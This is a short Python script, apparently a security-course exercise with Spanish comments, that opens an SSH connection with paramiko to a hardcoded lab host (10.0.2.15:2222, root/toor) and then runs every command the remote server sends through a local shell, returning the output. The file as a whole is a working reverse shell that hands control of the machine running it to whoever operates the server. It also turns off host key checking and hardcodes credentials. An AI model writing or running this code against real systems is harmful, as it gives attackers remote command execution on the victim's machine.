import paramiko
import shlex
import subprocess

def command(ip, port, user, passwd, cmd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(cmd)
        print(ssh_session.recv(1024))
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
    client.close()
    return

def main():
    import getpass
    #getpass puede recuperar el user de la sesion actual
    #oculata el input del password
    #ip = input('Enter server IP: ')
    #port = input('Enter port: ')
    command('10.0.2.15', 2222,'root', 'toor', 'ClientConnected')

main()
